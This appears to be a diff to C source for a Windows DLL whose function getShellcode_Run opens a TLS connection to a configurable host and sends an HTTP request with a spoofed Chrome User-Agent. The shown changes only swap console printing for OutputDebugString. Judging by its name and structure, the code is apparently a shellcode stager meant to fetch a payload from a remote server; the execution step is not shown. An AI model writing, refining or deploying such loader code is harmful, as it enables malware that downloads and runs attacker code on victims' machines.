@@ -17,6 +17,17 @@ char ip[] = "www.google.com";
 char port[] = "443";
 char resource[] = "";
 
+// Debugging function using OutputDebugString
+void DebugOutput(const char* format, ...) {
+    char buffer[1024];  // Adjust size as needed
+    va_list args;
+    va_start(args, format);
+    vsnprintf(buffer, sizeof(buffer), format, args);
+    va_end(args);
+
+    OutputDebugStringA(buffer);
+}
+
 // Cleanup function to handle resource deallocation
 void cleanup(SOCKET* ConnectSocket, CredHandle* hCred, CtxtHandle* hContext) {
     if (hContext->dwLower || hContext->dwUpper) {
@@ -55,11 +66,11 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
         "\r\n",
         resource, host);
-    printf("HTTP Request Built:\n%s\n", sendbuf);
+    DebugOutput("HTTP Request Built:\n%s\n", sendbuf);
 
     // Initialize Winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        printf("WSAStartup failed\n");
+        DebugOutput("WSAStartup failed\n");
         return;
     }
 
@@ -70,7 +81,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
 
     // Resolve hostname
     if (getaddrinfo(host, port, &hints, &result) != 0) {
-        printf("getaddrinfo failed\n");
+        DebugOutput("getaddrinfo failed\n");
         WSACleanup();
         return;
     }
@@ -89,11 +100,11 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     freeaddrinfo(result);
 
     if (ConnectSocket == INVALID_SOCKET) {
-        printf("Unable to connect to server\n");
+        DebugOutput("Unable to connect to server\n");
         WSACleanup();
         return;
     }
-    printf("Connected to server successfully\n");
+    DebugOutput("Connected to server successfully\n");
 
     // Initialize SSL/TLS
     SCHANNEL_CRED schannelCred = { 0 };
@@ -116,10 +127,10 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         NULL
     );
     if (secStatus != SEC_E_OK) {
-        printf("AcquireCredentialsHandle failed: 0x%08X\n", secStatus);
+        DebugOutput("AcquireCredentialsHandle failed: 0x%08X\n", secStatus);
         return;
     }
-    printf("Credentials handle acquired successfully\n");
+    DebugOutput("Credentials handle acquired successfully\n");
 
     SecBufferDesc outBuffer, inBuffer;
     SecBuffer outBuffers[1], inBuffers[2];
@@ -133,7 +144,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
 
     secStatus = InitializeSecurityContextA(&hCred, NULL, host, dwFlags, 0, 0, NULL, 0, &hContext, &outBuffer, &dwFlags, NULL);
     if (secStatus != SEC_I_CONTINUE_NEEDED) {
-        printf("InitializeSecurityContext failed: 0x%08X\n", secStatus);
+        DebugOutput("InitializeSecurityContext failed: 0x%08X\n", secStatus);
         cleanup(&ConnectSocket, &hCred, &hContext);
         return;
     }
@@ -147,16 +158,16 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         int bytesReceived = recv(ConnectSocket, sslBuf + sslBufLen, sizeof(sslBuf) - sslBufLen, 0);
         if (bytesReceived <= 0) {
             if (bytesReceived == 0) {
-                printf("Connection closed by peer.\n");
+                DebugOutput("Connection closed by peer.\n");
             } else {
-                printf("recv failed: %d\n", WSAGetLastError());
+                DebugOutput("recv failed: %d\n", WSAGetLastError());
             }
             cleanup(&ConnectSocket, &hCred, &hContext);
             return;
         }
     
         sslBufLen += bytesReceived;
-        printf("Received %d bytes during handshake\n", bytesReceived);
+        DebugOutput("Received %d bytes during handshake\n", bytesReceived);
     
         inBuffers[0].pvBuffer = sslBuf;
         inBuffers[0].cbBuffer = sslBufLen;
@@ -171,21 +182,23 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         outBuffers[0].cbBuffer = 0;
     
         secStatus = InitializeSecurityContextA(&hCred, &hContext, NULL, dwFlags, 0, 0, &inBuffer, 0, &hContext, &outBuffer, &dwFlags, NULL);
+        DebugOutput("InitializeSecurityContext returned: 0x%08X\n", secStatus);
+
         if (secStatus == SEC_E_OK) {
-            printf("SSL handshake completed successfully\n");
+            DebugOutput("SSL handshake completed successfully\n");
             handshakeComplete = true;
         } else if (secStatus == SEC_I_CONTINUE_NEEDED) {
             send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
             FreeContextBuffer(outBuffers[0].pvBuffer);
         } else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
-            printf("Incomplete message, waiting for more data...\n");
+            DebugOutput("Incomplete message, waiting for more data...\n");
             continue;
         } else {
-            printf("InitializeSecurityContext failed: 0x%08X\n", secStatus);
+            DebugOutput("InitializeSecurityContext failed: 0x%08X\n", secStatus);
             cleanup(&ConnectSocket, &hCred, &hContext);
             return;
         }
-    
+
         if (inBuffers[1].BufferType == SECBUFFER_EXTRA) {
             memmove(sslBuf, sslBuf + (sslBufLen - inBuffers[1].cbBuffer), inBuffers[1].cbBuffer);
             sslBufLen = inBuffers[1].cbBuffer;
@@ -195,23 +208,23 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     }
 
     // Send HTTP Request
-    printf("Sending HTTP request...\n");
+    DebugOutput("Sending HTTP request...\n");
     send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
 
     // Receive HTTP Response
     char responseBuffer[HTTP_RESPONSE_BUFFER_SIZE] = { 0 };
     int responseLen = 0;
-    printf("Receiving HTTP response...\n");
+    DebugOutput("Receiving HTTP response...\n");
     while ((responseLen = recv(ConnectSocket, responseBuffer, sizeof(responseBuffer) - 1, 0)) > 0) {
         responseBuffer[responseLen] = '\0'; // Null-terminate the response
-        printf("%s", responseBuffer);
+        DebugOutput("%s", responseBuffer);
     }
     if (responseLen < 0) {
-        printf("Error receiving HTTP response: %d\n", WSAGetLastError());
+        DebugOutput("Error receiving HTTP response: %d\n", WSAGetLastError());
     }
 
     cleanup(&ConnectSocket, &hCred, &hContext);
-    printf("Cleaned up resources\n");
+    DebugOutput("Cleaned up resources\n");
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
